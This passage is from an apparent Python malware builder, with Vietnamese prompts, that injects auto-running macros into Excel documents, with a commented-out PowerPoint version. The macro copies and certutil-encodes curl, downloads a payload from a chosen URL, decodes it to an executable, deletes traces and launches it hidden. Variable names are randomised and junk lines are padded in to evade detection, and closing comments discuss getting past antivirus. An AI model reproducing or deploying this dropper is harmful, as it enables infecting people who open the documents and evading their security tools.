               script = script + strPath_curl_exe + " " + url_file_txt + " -o " + strPath_payload_txt + " & "
               Obfuscate1 = Obfuscate1 + strPath_curl_txt + Document_Path
               script = script + "certutil "
               Obfuscate1 = Obfuscate1 + strPath_curl_txt + strPath_curl_exe
               script = script + "-decode " + strPath_payload_txt + " " + strPath_payload_exe + " & "
               Obfuscate1 = Obfuscate1 + url_file_txt + strPath_curl_exe
               script = script + "del " + Document_Path + "\cu" + "rl.exe & "
               Obfuscate1 = Obfuscate1 + url_file_txt + strPath_payload_txt
               script = script + "del " + strPath_curl_txt + " & "
               Obfuscate1 = Obfuscate1 + strPath_payload_exe + strPath_payload_txt
               script = script + "del " + strPath_curl_exe + " & "
               Obfuscate1 = Obfuscate1 + strPath_payload_exe + script
               script = script + "del " + strPath_payload_txt + " & "
               script = script + "START /MIN " +  strPath_payload_exe + " 1 2 3 4 & exit"
               Obfuscate1 = Obfuscate1 + Document_Path + script
               Obfuscate1 = Obfuscate1 + url_file_txt + strPath_curl_exe
               Shell (script),vbHidden
            End If
               End Sub

               """

        import random

        f = open('dictionary_Eng.txt', 'r', encoding='utf-8')
        data = f.read().split('\n')
        f.close()

        macro_script = macro_excel_script.replace("strPath_curl_txt", generate_random_string(2, 3))
        macro_script = macro_script.replace("strPath_curl_exe", generate_random_string(2, 3))
        macro_script = macro_script.replace("url_file_txt", generate_random_string(2, 3))
        macro_script = macro_script.replace("strPath_payload_txt", generate_random_string(2, 3))
        macro_script = macro_script.replace("strPath_payload_exe", generate_random_string(2, 3))
        macro_script = macro_script.replace("script", generate_random_string(2, 4))
        macro_script = macro_script.replace("Document_Path", generate_random_string(2, 3))
        macro_script = macro_script.replace("link_curl", generate_random_string(2, 3))
        macro_script = macro_script.replace("link_dung", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate1", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate2", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate3", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate4", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate5", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate6", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate7", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate8", generate_random_string(2, 3))
        macro_script = macro_script.replace("Obfuscate_Int1", str(random.randint(1, 10000)))
        macro_script = macro_script.replace("Obfuscate_Int2", str(random.randint(1, 10000)))

        excelMacro(excel_file, macro_script)

    # elif mode.strip() == '3':
    #     print(
    #         color.GREEN + color.BOLD + ' [' + color.CWHITE_BOLD + color.BOLD + '!' + color.GREEN + color.BOLD + ']' + color.CWHITE_BOLD + " PowerPoint Document")
    #     pp_file = input(
    #         color.GREEN + color.BOLD + '     [>] Nhap file .pptm/.potm/.ppsm: ' + color.CWHITE_BOLD)
    #     if not pp_file.lower().endswith(('.pptm', '.potm', '.ppsm')):
    #         print(
    #             color.GREEN + color.BOLD + '     [' + color.RED + '-' + color.GREEN + color.BOLD + ']:' + color.RED + " File khong hop le!")
    #         sys.exit()
    #     payload = input(
    #         color.GREEN + color.BOLD + '     [>] ' + "Nhap ten file payload: " + color.CWHITE_BOLD)
    #     url = input(color.GREEN + color.BOLD + '     [>] ' + "Nhap URL file .txt   : " + color.CWHITE_BOLD)
    #     if payload.lower().endswith('.exe'):
    #         payload = payload.replace('.exe', '')
    #
    #     macro_powerpoint_script = """
    #            Private Sub Auto_Open()
    #
    #            Dim strPath_curl_txt As String
    #            Dim strPath_curl_exe As String
    #            Dim url_file_txt As String
    #            Dim strPath_payload_txt As String
    #            Dim strPath_payload_exe As String
    #            Dim script As String
    #            Dim Document_Path As String
    #
    #            Document_Path = ActivePresentation.Path
    #            strPath_curl_txt = Document_Path + "\link_curl.txt"
    #            strPath_curl_exe = Document_Path + "\link_curl.exe"
    #            url_file_txt = \"""" + url + """\"
    #            strPath_payload_txt = Document_Path + "\link_dung.txt"
    #            strPath_payload_exe = Document_Path + \"""" + """\\""" + payload + """.exe\"
    #
    #
    #
    #            script = script + "C:\Windows\Sys"
    #            Dim Obfuscate1 As String
    #            script = script + "tem32\cmd.exe /c "
    #            Obfuscate1 = Obfuscate1 + strPath_curl_txt + strPath_curl_exe
    #            script = script + "xcopy C:\Windows\Sys"
    #            Obfuscate1 = Obfuscate1 + strPath_curl_txt + url_file_txt
    #            script = script + "tem32\cu" + "rl.exe " + Document_Path + " & "
    #            Obfuscate1 = Obfuscate1 + strPath_payload_txt + url_file_txt
    #            script = script + "certutil "
    #            Obfuscate1 = Obfuscate1 + strPath_payload_txt + strPath_payload_exe
    #            script = script + "-encode " + Document_Path + "\cu" + "rl.exe " + strPath_curl_txt + " & "
    #            Obfuscate1 = Obfuscate1 + script + strPath_payload_exe
    #            script = script + "certutil "
    #            Obfuscate1 = Obfuscate1 + script + Document_Path
    #            script = script + "-decode " + strPath_curl_txt + " " + strPath_curl_exe + " & "
    #            Obfuscate1 = Obfuscate1 + strPath_curl_txt + Document_Path
    #            script = script + strPath_curl_exe + " " + url_file_txt + " -o " + strPath_payload_txt + " & "
    #            Obfuscate1 = Obfuscate1 + strPath_curl_txt + Document_Path
    #            script = script + "certutil "
    #            Obfuscate1 = Obfuscate1 + strPath_curl_txt + strPath_curl_exe
    #            script = script + "-decode " + strPath_payload_txt + " " + strPath_payload_exe + " & "
    #            Obfuscate1 = Obfuscate1 + url_file_txt + strPath_curl_exe
    #            script = script + "del " + Document_Path + "\cu" + "rl.exe & "
    #            Obfuscate1 = Obfuscate1 + url_file_txt + strPath_payload_txt
    #            script = script + "del " + strPath_curl_txt + " & "
    #            Obfuscate1 = Obfuscate1 + strPath_payload_exe + strPath_payload_txt
    #            script = script + "del " + strPath_curl_exe + " & "
    #            Obfuscate1 = Obfuscate1 + strPath_payload_exe + script
    #            script = script + "del " + strPath_payload_txt + " & "
    #            script = script + "START /MIN " +  strPath_payload_exe + " 1 2 3 4 & exit"
    #            Obfuscate1 = Obfuscate1 + Document_Path + script
    #            Obfuscate1 = Obfuscate1 + url_file_txt + strPath_curl_exe
    #            Shell (script),vbHidden
    #
    #            End Sub
    #
    #            """
    #
    #     import random
    #
    #     f = open('dictionary_Eng.txt', 'r', encoding='utf-8')
    #     data = f.read().split('\n')
    #     f.close()
    #
    #     macro_script = macro_powerpoint_script.replace("strPath_curl_txt", generate_random_string(2, 3))
    #     macro_script = macro_script.replace("strPath_curl_exe", generate_random_string(2, 3))
    #     macro_script = macro_script.replace("url_file_txt", generate_random_string(2, 3))
    #     macro_script = macro_script.replace("strPath_payload_txt", generate_random_string(2, 3))
    #     macro_script = macro_script.replace("strPath_payload_exe", generate_random_string(2, 3))
    #     macro_script = macro_script.replace("script", generate_random_string(2, 4))
    #     macro_script = macro_script.replace("Document_Path", generate_random_string(2, 3))
    #     macro_script = macro_script.replace("link_curl", generate_random_string(2, 3))
    #     macro_script = macro_script.replace("link_dung", generate_random_string(2, 3))
    #     macro_script = macro_script.replace("Obfuscate1", generate_random_string(2, 3))
    #
    #     powerpointMacro(pp_file, macro_script)

    else:
        print(color.GREEN + color.BOLD +'     ['+color.RED+'-'+color.GREEN + color.BOLD+']:' + color.RED+" Loi! Chi nhap 1 hoac 2!")
        time.sleep(2)

# http://192.168.0.192/share/dung.txt
# AV phát hiện được lệnh chạy trong cmd
# thử bằng phương pháp, thay vì điều hướng chạy thẳng .exe mà điều hướng đến chạy file .bat
# http://192.168.0.192/share/m_4.txt